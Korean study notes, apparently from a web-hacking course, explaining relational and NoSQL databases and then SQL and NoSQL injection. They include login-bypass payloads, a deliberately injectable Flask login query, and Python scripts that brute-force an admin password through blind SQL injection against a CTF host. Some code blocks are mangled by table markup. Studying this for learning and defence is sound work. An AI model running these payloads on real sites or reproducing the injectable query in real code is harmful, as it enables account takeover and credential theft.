
# Database Management System

- 웹 서비스는 데이터베이스에 정보를 저장하고, 이를 관리하기 위해 **Database Management System(DBMS)** 를 사용한다. 
- DBMS는 데이터베이스에 새로운 정보를 기록하거나, 기록된 내용을 수정, 삭제하는 역할을 한다.
- DBMS에는 다수의 사람이 동시에 데이터베이스에 접근할 수 있고, 웹 서비스의 검색 기능과 같이 복잡한 요구사항을 만족하는 데이터를 조회할 수 있다는 특징이 있다.
### 관계형(Relational) : MySQL, MariaDB, PostgreSQL, SQLite

### 비관계형(Non-Relational) : MongoDB, CouchDB, Redis

- 두 DBMS의 가장 큰 차이로 관계형은 열의 집합인 테이블 형식으로 데이터를 저장하고, 비관계형은 테이블 형식이 아닌 키-값(Key-Value) 형태로 값을 저장한다.

- **Relational DataBase Management System RDBMS, 관계형 RDBMS** 는  1970년에 Codss가 12가지 규칙을 정의하여 생성한 데이터베이스 모델이다.

- RDBMS는 행과 열의 집합으로 구성된 테이블의 묶음으로 데이터를 관리하고, 테이블 형식의 데이터를 조작할 수 있는 관계 연산자를 제공한다. 
- 실제로 12가지의 규칙을 정의했지만, 실제로 구현된 RDBMS들은 12가지 규칙을 전부 따르지는 않았고, 최소한의 조건으로 앞의 두 조건을 만족하는 DBMS를 RDBMS라고 부르게 되었다.
- RDBMS에서 관계 연산자는 **Structed Query Language(SQL)** 라는 쿼리 언어를 사용하고, 쿼리를 통해 테이블 형식의 데이터를 조작한다.

| 학번(문자열)  | 이름(문자열) | 생년월일(날짜)   | 번호(문자열)       |
| -------- | ------- | ---------- | ------------- |
| 20211234 | 드림이     | 2020.04.01 | 010-1337-1337 |
| 20211235 | 오리      | 2016.01.01 | 070-8864-1337 |

## SQL

- **Structed Query Language(SQL)** 는 RDBMS의 데이터를 정리하고 질의, 수정 등을 하기 위해 고안된 언어이다. 
- SQL은 구조화된 형태를 가지는 언어로 웹 어플리케이션이 DBMS와 상호작용할 때 사용된다.

### DDL (Data DEfinition Language) 
- 데이터를 정의하기 위한 언어이다. 
- 데이터를 저장하기 위한 스키마, 데이터 베이스의 생성/수정/삭제 등의 행위를 수행한다.
- 웹 어플리케이션은 SQL을 사용해서 데이터를 관리한다. RDBMS에서 사용하는 기본적인 구조는 데이터베이스 -> 테이블 -> 데이터 구조이다. 
- 데이터를 다루기 위해 데이터베이스와 테이블을 생성해야 하며, DDL을 사용해야 한다. DDL의 CREATE 명령어를 이용해 새로운 데이터베이스 또는 테이블을 생성 가능하다.

- DreamHack이라는 데이터베이스를 생성하는 쿼리문 

```sql
CREATE DATABASE Dreamhack;
```

#### 테이블 생성
- 앞서 생성한 Database에 Baord 테이블을 생성하는 쿼리문이다.
```sql
USE Dreamhack;# Board 이름의 테이블 생성
CREATE TABLE Board( 
	idx INT AUTO_INCREMENT, 
	boardTitle VARCHAR(100) NOT NULL, 
	boardContent VARCHAR(2000) NOT NULL, 
	PRIMARY KEY(idx)
	);
```
---
### DML (Data Manipulation Language)
- 데이터를 조작하기 위한 언어이다.
- 실제 데이터베이스 내에 존재하는 데이터에 대해 조회/저장/수정/삭제 등의 행위를 수행한다.

#### 테이블 데이터 생성
- Board 테이블에 데이터를 삽입하는 쿼리문
```sql
INSERT INTO 
	Board(boardTitle, boardContent, createdDate) 
	Values( 'Hello', 
	'World !', 
	Now()
	);
```
#### 테이블 데이터 조회
- Board 테이블의 데이터를 조회하는 쿼리문
``` sql
SELECT 
	boardTitle, boardContent
FROM 
	Board
Where 
	idx=1;
```

#### 테이블 데이터 변경
- Board 테이블의 컬럼 값을 변경하는 쿼리문
```sql
UPDATE Board SET boardContent='DreamHack!' 
	Where idx=1;
```
---
### DCL (Data Control Language) 
- 데이터베이스의 접근 권한 등의 설정을 하기 위한 언어이다.
- 데이터베이스 내에 이용자의 권한을 부여하기 위한 **GRANT**와 권한을 박탈하는 **REVOKE**가 대표적이다.
- ---
```sql
SELECT * FROM user_table WHERE uid='admin' or '1' and upw='';
```
- 첫 번째 조건은 uid가 "admin"인 데이터, 두 번째 조건은 이전의 식이 참이고 upw가 없는 경우이다.
- 첫 번째 조건은 admin의 결과를 반환하고, 두 번째 조건은 아무것도 반환하지 않는다.
- 즉 uid가 admin인 데이터를 반환하기 때문에 관리자 계정으로 로그인 가능하다.
## Blind SQL Injection

- 해당 공격 기법은 스무고개 게임과 유사한 방식으로 데이터를 알아낼 수 있다.
- Question #1. dreamhack 계정의 비밀번호 첫 번째 글자는 'x' 인가요?
    
    - Answer. 아닙니다
        
- Question #2. dreamhack 계정의 비밀번호 첫 번째 글자는 'p' 인가요?
    
    - Answer. 맞습니다 (첫 번째 글자 = `p`)
        
- Question #3. dreamhack 계정의 비밀번호 두 번째 글자는 'y' 인가요?
    
    - Answer. 아닙니다.
        
- Question #4. dreamhack 계정의 비밀번호 두 번째 글자는 'a'인가요?
    
    - Answer. 맞습니다. (두 번째 글자 = `a`)

- 이처럼 질의 결과를 이용자가 직접 화면에서 확인하지 못할 때 참/ 거짓 반환 결과로 데이터를 획득하는 공격기법을 **Blind SQL Injection**이라고 부른다
### substr

해당 함수에 전달되는 인자와 예시는 다음과 같습니다. 해당 함수는 문자열에서 지정한 위치부터 길이까지의 값을 가져옵니다.

```sql
substr(string, position, length)
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

```sql
# 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True

두 번째 글자 구하기 (아스키 115 = 's', 116 = 't')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True
```

- Blind SQL Injection은 한 바이트씩 공격하는 방식이기 때문에 많은 시간을 들여야 한다. 
- 때문에 공격 스크립트를 작성하기 앞서 Requests 모듈을 알아야 한다.
```python
import requests

url = 'https://dreamhack.io/'
headers = { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'DREAMHACK_REQUEST'}

params = { 'test': 1,}
for i in range(1, 5): 
	c = requests.get(url + str(i), headers=headers, params=params) 
	print(c.request.url) 
	print(c.text)
```
- 윗 코드는 requests 모듈을 통해 http의 get 메소드 통신을 하는 코드이다.
- requests.get 은 GET 메소드를 사용해 HTTP 요청을 보내는 함수로 URL과 Header Body  와 함께 요청을 전송할 수 있다.
```python
#!/usr/bin/python3
import requests
import string

# example URL
url = 'http://example.com/login'
params = { 'uid': '',
		  'upw': ''}

#abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
tc = string.ascii_letters + string.digits + string.punctuation

# 사용할 SQL Injection 쿼리
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--'''
password = ''

# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20): 
	for ch in tc: 
	# query를 이용하여 Blind SQL Injection 시도 
	params['uid'] = query.format(idx=idx+1, val=ord(ch)).strip("\n") 
	c = requests.get(url, params=params) 
	print(c.request.url) 
	# 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
	if c.text.find("Login success") != -1: 
		password += ch 
		break
  
print(f"Password is {password}")
```

## Exercise

```mysql
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우,
db = sqlite3.connect(DATABASE) # 데이터베이스 파일 생성 및 연결|
db.execute('create table users(userid char(100), userpassword char(100));') # users 테이블 생성
# users 테이블에 관리자와 guest 계정 생성|
db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
db.commit() # 쿼리 실행 확정
db.close() # DB 연결 종료
```

```mysql

||# Login 기능에 대해 GET과 POST HTTP 요청을 받아 처리함|
||@app.route('/login', methods=['GET', 'POST'])|
||def login():|
||# 이용자가 GET 메소드의 요청을 전달한 경우,|
||if request.method == 'GET':|
||return render_template('login.html') # 이용자에게 ID/PW를 요청받는 화면을 출력|
||# POST 요청을 전달한 경우|
||else:|
||userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,|
||userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고|
||# users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴|
||res = query_db(|
||f'select * from users where userid="{userid}" and userpassword="{userpassword}"'|
||)|
|||
||if res: # 쿼리 결과가 존재하는 경우|
||userid = res[0] # 로그인할 계정을 해당 쿼리 결과의 결과에서 불러와 사용|
|||
||if userid == 'admin': # 이 때, 로그인 계정이 관리자 계정인 경우|
||return f'hello {userid} flag is {FLAG}' # flag를 출력|
|||
||# 관리자 계정이 아닌 경우, 웰컴 메시지만 출력|
||return f'<script>alert("hello {userid}");history.go(-1);</script>'|
|||
||# 일치하는 회원 정보가 없는 경우 로그인 실패 메시지 출력|
||return '<script>alert("wrong");history.go(-1);</script>'|
```

```mysql

||def login(): # login 함수 선언|
||...|
||userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,|
||userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고|
||# users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴|
||res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')|
||...|
|||
||def query_db(query, one=True): # query_db 함수 선언|
||cur = get_db().execute(query) # 연결된 데이터베이스에 쿼리문을 질의|
||rv = cur.fetchall() # 쿼리문 내용을 받아오기|
||cur.close() # 데이터베이스 연결 종료|
||return (rv[0] if rv else None) if one else rv # 쿼리문 질의 내용에 대한 결과를 반환|
```
```mysql
SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";
```
```mysql

||/*|
||ID: admin, PW: DUMMY|
||userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식|
||*/|
||SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"|
|||
||/*|
||ID: admin" or "1 , PW: DUMMY|
||userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식|
||*/|
||SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"|
|||
||/*|
||ID: admin, PW: DUMMY" or userid="admin|
||userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식|
||*/|
||SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"|
|||
||/*|
||ID: " or 1 LIMIT 1,1-- , PW: DUMMY|
||userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식|
||*/|
||SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"|
```

---
### 비밀번호 길이 파악악
```mysql

|#!/usr/bin/python3|
||import requests|
||import sys|
||from urllib.parse import urljoin|
|||
|||
||class Solver:|
||"""Solver for simple_SQLi challenge"""|
|||
||# initialization|
||def __init__(self, port: str) -> None:|
||self._chall_url = f"http://host1.dreamhack.games:{port}"|
||self._login_url = urljoin(self._chall_url, "login")|
|||
||# base HTTP methods|
||def _login(self, userid: str, userpassword: str) -> bool:|
||login_data = {|
||"userid": userid,|
||"userpassword": userpassword|
||}|
||resp = requests.post(self._login_url, data=login_data)|
||return resp|
|||
||# base sqli methods|
||def _sqli(self, query: str) -> requests.Response:|
||resp = self._login(f"\" or {query}-- ", "hi")|
||return resp|
|||
||def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:|
||while 1:|
||mid = (low+high) // 2|
||if low+1 >= high:|
||break|
||query = query_tmpl.format(val=mid)|
||if "hello" in self._sqli(query).text:|
||high = mid|
||else:|
||low = mid|
||return mid|
|||
||# attack methods|
||def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:|
||query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"|
||pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)|
||return pw_len|
|||
||def solve(self):|
||pw_len = solver._find_password_length("admin")|
||print(f"Length of admin password is: {pw_len}")|
|||
|||
||if __name__ == "__main__":|
||port = sys.argv[1]|
||solver = Solver(port)|
||solver.solve()|
```

```
$ ./ex.py 23742
Length of the admin password is: [redacted]
```

### 비밀번호 획득

```mysql

|#!/usr/bin/python3|
||import requests|
||import sys|
||from urllib.parse import urljoin|
|||
|||
||class Solver:|
||"""Solver for simple_SQLi challenge"""|
|||
||# initialization|
||def __init__(self, port: str) -> None:|
||self._chall_url = f"http://host1.dreamhack.games:{port}"|
||self._login_url = urljoin(self._chall_url, "login")|
|||
||# base HTTP methods|
||def _login(self, userid: str, userpassword: str) -> requests.Response:|
||login_data = {"userid": userid, "userpassword": userpassword}|
||resp = requests.post(self._login_url, data=login_data)|
||return resp|
|||
||# base sqli methods|
||def _sqli(self, query: str) -> requests.Response:|
||resp = self._login(f'" or {query}-- ', "hi")|
||return resp|
|||
||def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:|
||while 1:|
||mid = (low + high) // 2|
||if low + 1 >= high:|
||break|
||query = query_tmpl.format(val=mid)|
||if "hello" in self._sqli(query).text:|
||high = mid|
||else:|
||low = mid|
||return mid|
|||
||# attack methods|
||def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:|
||query_tmpl = f'((SELECT LENGTH(userpassword) WHERE userid="{user}") < {{val}})'|
||pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)|
||return pw_len|
|||
||def _find_password(self, user: str, pw_len: int) -> str:|
||pw = ""|
||for idx in range(1, pw_len + 1):|
||query_tmpl = f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'|
||pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2F, 0x7E))|
||print(f"{idx}. {pw}")|
||return pw|
|||
||def solve(self) -> None:|
||# Find the length of admin password|
||pw_len = solver._find_password_length("admin")|
||print(f"Length of the admin password is: {pw_len}")|
||# Find the admin password|
||print("Finding password:")|
||pw = solver._find_password("admin", pw_len)|
||print(f"Password of the admin is: {pw}")|
|||
|||
||if __name__ == "__main__":|
||port = sys.argv[1]|
||solver = Solver(port)|
||solver.solve()|
```

# Non-Relational DBMS(NRDBMS, NoSQL)
- RDBMS는 스키마를 정의하고 해당 규격에 맞는 데이터를 2차원 테이블 형태로 저장한다. 이는 복잡할 뿐만 아니라, 저장해야하는 데이터가 많아지면 용량의 한계에 다다를 수 있다는 단점이 있다.
- 이를 해결하기 위해 등장한 것이 비 관계형 데이터베이스, 즉 Non-Relational DBMS 이다.
- RDBMS는 SQL을 사용해 데이터를 조회 및 추가 그리고 삭제할 수 있다
- NoSQL은 SQL를 사용하지 않고 복잡하지 않은 데이터를 저장해 단순 검색 및 추가 검색 작업을 위해 매우 최적화된 저장 공간인 것이 큰 특징이자 RDBMS와 의 차이점이다.
- 이 외에도, 키-값을 사용해 데이터를 저장하는 차이점이 존재한다.

MongoDB는 Json 형태인 도큐먼트(document)를 저장하며 다음과 같은 특징을 갖는다.

1. 스키마를 따로 정의하지 않아 각 컬렉션에 대한 정의가 필요하지 않다.
2. JSON형식으로 쿼리를 작성할 수 있따.
3. id 필드가 Primary Key 역할을 한다.
```mysql
||$ mongosh|
||> db.user.insertOne({uid: 'admin', upw: 'secretpassword'})|
||{ acknowledged: true, insertedId: ObjectId("5e71d395b050a2511caa827d")}|
||> db.user.find({uid: 'admin'})|
||[{ "_id" : ObjectId("5e71d395b050a2511caa827d"), "uid" : "admin", "upw" : "secretpassword" }]|
```

각 DBMS에서 Status의 값이 "A"이고 qty의 값이 30보다 작은 데이터를 조회하는 쿼리는 다음과 같다.

### RDBMS
```mysql
||SELECT * FROM inventory WHERE status = "A" and qty < 30;|
```
### MongoDB
```mysql
|db.inventory.find(|
||{ $and: [|
||{ status: "A" },|
||{ qty: { $lt: 30 } }|
||]}|
||)|
```

## Comparison

|Name|Description|
|---|---|
|`$eq`|지정된 값과 같은 값을 찾습니다. **(equal)**|
|`$in`|배열 안의 값들과 일치하는 값을 찾습니다. **(in)**|
|`$ne`|지정된 값과 같지 않은 값을 찾습니다. **(not equal)**|
|`$nin`|배열 안의 값들과 일치하지 않는 값을 찾습니다. **(not in)**|
## Logical

|Name|Description|
|---|---|
|`$and`|논리적 AND, 각각의 쿼리를 모두 만족하는 문서가 반환됩니다.|
|`$not`|쿼리 식의 효과를 반전시킵니다. 쿼리 식과 일치하지 않는 문서를 반환합니다.|
|`$nor`|논리적 NOR, 각각의 쿼리를 모두 만족하지 않는 문서가 반환됩니다.|
|`$or`|논리적 OR, 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됩니다.|

## Element

|Name|Description|
|---|---|
|`$exists`|지정된 필드가 있는 문서를 찾습니다.|
|`$type`|지정된 필드가 지정된 유형인 문서를 선택합니다.|

## Evaluation

|Name|Description|
|---|---|
|`$expr`|쿼리 언어 내에서 집계 식을 사용할 수 있습니다.|
|`$regex`|지정된 정규식과 일치하는 문서를 선택합니다.|
|`$text`|지정된 텍스트를 검색합니다.|
### SQL

|   |   |
|---|---|
||SELECT * FROM account;|


|   |   |
|---|---|
||SELECT * FROM account WHERE user_id="admin";|


|   |   |
|---|---|
||SELECT user_idx FROM account WHERE user_id="admin";|
### MongoDB

|     |                   |
| --- | ----------------- |
|     | db.account.find() |

|   |   |
|---|---|
||db.account.find(|
||{ user_id: "admin" }|
||)|

|   |   |
|---|---|
||db.account.find(|
||{ user_id: "admin" },|
||{ user_idx:1, _id:0 }|
||)|


## INSERT

### SQL

|   |   |
|---|---|
||INSERT INTO account(user_id,user_pw,) VALUES ("guest", "guest");|

### MongoDB

|   |   |
|---|---|
||db.account.insertOne(|
||{ user_id: "guest",user_pw: "guest" }|
||)|

## DELETE

### SQL

|   |   |
|---|---|
||DELETE FROM account;|


|   |   |
|---|---|
||DELETE FROM account WHERE user_id="guest";|

### MongoDB

|   |   |
|---|---|
||db.account.remove()|

|   |   |
|---|---|
||db.account.remove(|
||{user_id: "guest"}|
||)|

## UPDATE

### SQL

|   |   |
|---|---|
||UPDATE account SET user_id="guest2" WHERE user_idx=2;|

![](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjkiIGhlaWdodD0iMzQiIHZpZXdCb3g9IjAgMCAyOSAzNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxIDAuNUgzQzEuMzUgMC41IDAgMS44NSAwIDMuNVYyNC41SDNWMy41SDIxVjAuNVpNMjUuNSA2LjVIOUM3LjM1IDYuNSA2IDcuODUgNiA5LjVWMzAuNUM2IDMyLjE1IDcuMzUgMzMuNSA5IDMzLjVIMjUuNUMyNy4xNSAzMy41IDI4LjUgMzIuMTUgMjguNSAzMC41VjkuNUMyOC41IDcuODUgMjcuMTUgNi41IDI1LjUgNi41Wk0yNS41IDMwLjVIOVY5LjVIMjUuNVYzMC41WiIgZmlsbD0iIzFBMUExQiIvPgo8L3N2Zz4K)

### MongoDB

|     |                                 |
| --- | ------------------------------- |
|     | db.account.updateOne(           |
|     | { user_idx: 2 },                |
|     | { $set: { user_id: "guest2" } } |
|     | )                               |
|     |                                 |
# Redis

- **Redis**는 키-값(Key-Value)의 쌍을 가진 데이터를 저장한다. 
- 제일 큰 특징은 다른 데이터베이스와 다르게 메모리 기반의 DBMS이다. 
- 메모리를 사용해 데이터를 저장하고 접근하기 때문에 읽고 쓰는 작업을 다른 DBMS보다 훨씬 빠르게 수행한다.
- 다양한 서비스에서 임시 데이터를 캐싱하는 용도로 주로 사용하고 있습니다.

- **아래 코드**는 Redis에서 데이터를 추가하고, 조회하는 명령어. 
- 오른쪽의 표는 Redis에서 데이터를 관리할 때 자주 사용하는 명령어이며, 이외의 명령어는 아래 첨부한 공식 문서를 통해 확인할 수 있다.
 
## 데이터 조회 및 조작 명령어

|명령어|구조|설명|
|---|---|---|
|**GET**|GET key|데이터 조회|
|**MGET**|MGET key [key ...]|여러 데이터를 조회|
|**SET**|SET key value|새로운 데이터 추가|
|**MSET**|MSET key value [key value ...]|여러 데이터를 추가|
|**DEL**|DEL key [key ...]|데이터 삭제|
|**EXISTS**|EXISTS key [key ...]|데이터 유무 확인|
|**INCR**|INCR key|데이터 값에 1 더함|
|**DECR**|DECR key|데이터 값에 1 뺌|

## 관리 명령어

|명령어|구조|설명|
|---|---|---|
|**INFO**|INFO [section]|DBMS 정보 조회|
|**CONFIG GET**|CONFIG GET parameter|설정 조회|
|**CONFIG SET**|CONFIG SET parameter value|새로운 설정을 입력|
# CouchDB

**CouchDB** 또한 MongoDB와 같이 JSON 형태인 도큐먼트(Document)를 저장합니다. 이는 웹 기반의 DBMS로, REST API 형식으로 요청을 처리합니다. 다음은 각 메소드에 따른 기능 설명이며, **아래 코드**는 HTTP 요청으로 레코드를 업데이트하고, 조회하는 예시입니다.

```
$ curl -X PUT http://{username}:{password}@localhost:5984/users/guest -d '{"upw":"guest"}'
{"ok":true,"id":"guest","rev":"1-22a458e50cf189b17d50eeb295231896"}

$ curl http://{username}:{password}@localhost:5984/users/guest
{"_id":"guest","_rev":"1-22a458e50cf189b17d50eeb295231896","upw":"guest"}
```

|**메소드**|**기능 설명**|
|---|---|
|POST|새로운 레코드를 추가합니다.|
|GET|레코드를 조회합니다.|
|PUT|레코드를 업데이트합니다.|
|DELETE|레코드를 삭제합니다.|

## 특수 구성 요소

CouchDB에서는 서버 또는 데이터베이스를 위해 다양한 기능을 제공합니다. 그 중 `_` 문자로 시작하는 URL, 필드는 특수 구성 요소를 나타냅니다. 다음은 각 구성 요소에 대한 설명입니다. 이 외 자세한 정보는 아래 첨부한 공식 문서를 통해 확인할 수 있습니다.

### SERVER

|**요소**|**설명**|
|---|---|
|/|인스턴스에 대한 메타 정보를 반환합니다.|
|/_all_dbs|인스턴스의 데이터베이스 목록을 반환합니다.|
|/_utils|관리자페이지로 이동합니다.|

### Database

|**요소**|**설명**|
|---|---|
|/db|지정된 데이터베이스에 대한 정보를 반환합니다.|
|/{db}/_all_docs|지정된 데이터베이스에 포함된 모든 도큐먼트를 반환합니다.|
|/{db}/_find|지정된 데이터베이스에서 JSON 쿼리에 해당하는 모든 도큐먼트를 반환합니다.|

|Name|Description|
|---|---|
|`$expr`|쿼리 언어 내에서 집계 식을 사용할 수 있습니다.|
|`$regex`|지정된 정규식과 일치하는 문서를 선택합니다.|
|`$text`|지정된 텍스트를 검색합니다.|
|`$where`|JavaScript 표현식을 만족하는 문서와 일치합니다.|
**표현식**

인자로 전달한 Javascript 표현식을 만족하는 데이터를 조회합니다. **Figure 7**을 살펴보면, 해당 연산자는 field에서 사용할 수 없는 것을 확인할 수 있습니다.

**substring**

해당 연산자로 Javascript 표현식을 입력하면, Blind SQL Injection에서 한 글자씩 비교했던 것과 같이 데이터를 알아낼 수 있습니다. **Figure 8**은 `upw`의 첫 글자를 비교해 데이터를 알아내는 쿼리입니다.

**Sleep 함수를 통한 Time based Injection**

MongoDB는 `sleep` 함수를 제공합니다. 표현식과 함께 사용하면 지연 시간을 통해 참/거짓 결과를 확인할 수 있습니다. **Figure 9**은 `upw`의 첫 글자를 비교하고, 해당 표현식이 참을 반환할 때 `sleep` 함수를 실행하는 쿼리입니다.

**Error based Injection**

Errror based Injection은 에러를 기반으로 데이터를 알아내는 기법으로, 올바르지 않은 문법을 입력해 고의로 에러를 발생시킵니다. **Figure 10**를 살펴보면, `upw`의 첫 글자가 'g' 문자인 경우 올바르지 않은 문법인 `asdf`를 실행하면서 에러가 발생합니다.

http://host1.dreamhack.games:13698/login?uid=guest&upw[$regex]=.*
http://host1.dreamhack.games:13698/login?uid[$regex]=ad.in&upw[$regex]=D.{*
